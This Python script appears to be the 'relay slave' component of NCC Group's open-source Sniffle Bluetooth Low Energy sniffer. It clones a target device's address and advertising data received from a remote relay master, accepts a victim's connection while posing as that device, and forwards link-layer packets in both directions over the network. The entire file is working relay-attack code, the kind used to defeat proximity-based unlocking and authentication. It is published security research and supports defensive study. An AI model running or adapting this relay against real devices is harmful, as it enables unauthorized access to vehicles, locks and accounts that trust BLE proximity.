#!/usr/bin/env python3

# Written by Sultan Qasim Khan
# Copyright (c) 2020, NCC Group plc
# Released as open source under GPLv3

import argparse, sys
from threading import Thread

from sniffle_hw import SniffleHW, BLE_ADV_AA, PacketMessage, DebugMessage, StateMessage, MeasurementMessage
from packet_decoder import DPacketMessage, ConnectIndMessage, LlDataContMessage
from relay_protocol import connect_relay, MessageType

# global variable to access hardware
hw = None
_aa = 0

def main():
    aparse = argparse.ArgumentParser(description="Relay slave script for Sniffle BLE5 sniffer")
    aparse.add_argument("-s", "--serport", default="/dev/ttyACM0", help="Sniffer serial port name")
    aparse.add_argument("-M", "--masteraddr", default="127.0.0.1", help="IP address of relay master")
    aparse.add_argument("-q", "--quiet", action="store_const", default=False, const=True,
            help="Don't show empty packets")
    args = aparse.parse_args()

    global hw
    hw = SniffleHW(args.serport)
    conn = connect_relay(args.masteraddr)
    print("Connected to master.")

    # Network latency test
    mtype, body = conn.recv_msg()
    if mtype != MessageType.PING or body != b'latency_test':
        raise ValueError("Unexpected message type in latency test")
    conn.send_msg(MessageType.PING, b'latency_test')

    # put the hardware in a normal state
    hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac()
    hw.cmd_auxadv(False)

    # fetch, decode, and apply preloaded conn params from master (if any)
    mtype, body = conn.recv_msg()
    if mtype != MessageType.PRELOAD:
        raise ValueError("Expected preloads")
    plstr = str(body, encoding='utf-8')
    preloads = []
    if len(plstr):
        # expect colon separated pairs, separated by commas
        preloads = []
        for tstr in plstr.split(','):
            tsplit = tstr.split(':')
            tup = (int(tsplit[0]), int(tsplit[1]))
            preloads.append(tup)
    hw.cmd_interval_preload(preloads)

    # obtain the target's advertisement and scan response from the master
    print("Waiting for advertisement and scan response...")
    mtype, advert_body = conn.recv_msg()
    if mtype != MessageType.ADVERT:
        raise ValueError("Got wrong message type %s" % mtype.name)
    mtype, scan_rsp_body = conn.recv_msg()
    if mtype != MessageType.SCAN_RSP:
        raise ValueError("Got wrong message type %s" % mtype.name)
    print("Received advertisement and scan response.")

    # parse the advert and scan response for later use
    advert = DPacketMessage.from_body(advert_body)
    scan_rsp = DPacketMessage.from_body(scan_rsp_body)

    # advertise to impersonate our target
    hw.cmd_setaddr(advert.AdvA, bool(advert.TxAdd))
    hw.cmd_adv_interval(200) # approx 200ms advertising interval
    adv_data = advert.body[8:]
    scan_rsp_data = scan_rsp.body[8:]
    hw.cmd_follow(True) # accept connections
    hw.mark_and_flush()
    hw.cmd_advertise(adv_data, scan_rsp_data)

    # wait for someone to connect to us
    conn_pkt = None
    while conn_pkt is None:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue

        dpkt = DPacketMessage.decode(msg)
        print(dpkt, end='\n\n')

        if isinstance(dpkt, ConnectIndMessage):
            hw.decoder_state.cur_aa = dpkt.aa_conn
            conn_pkt = dpkt

    # notify relay master of the connection
    conn.send_msg(MessageType.CONN_REQ, conn_pkt.body)

    # fire up a thead to forward traffic from relay master
    master_thread = Thread(target=network_thread_loop, args=(conn,), daemon=True)
    master_thread.start()

    # main receive loop
    while True:
        msg = hw.recv_and_decode()
        print_message(msg, args.quiet)

        # only forward packets
        if not isinstance(msg, PacketMessage):
            continue
        msg = DPacketMessage.decode(msg)

        # ignore empty packets
        if isinstance(msg, LlDataContMessage) and msg.data_length == 0:
            continue

        # forward received packets to relay master
        conn.send_msg(MessageType.PACKET, msg.body)

def network_thread_loop(conn):
    # receive packets from relay master and retransmit them here
    while True:
        mtype, body = conn.recv_msg()
        if mtype != MessageType.PACKET:
            continue
        llid = body[0] & 3
        pdu = body[2:]
        hw.cmd_transmit(llid, pdu)

def print_message(msg, quiet=False):
    if isinstance(msg, PacketMessage):
        print_packet(msg, quiet)
    elif isinstance(msg, DebugMessage) or \
            isinstance(msg, StateMessage) or \
            isinstance(msg, MeasurementMessage):
        print(msg, end='\n\n')

def print_packet(pkt, quiet=False):
    # Further decode and print the packet
    dpkt = DPacketMessage.decode(pkt)
    if quiet and isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0:
        return
    print(dpkt, end='\n\n')

if __name__ == "__main__":
    main()
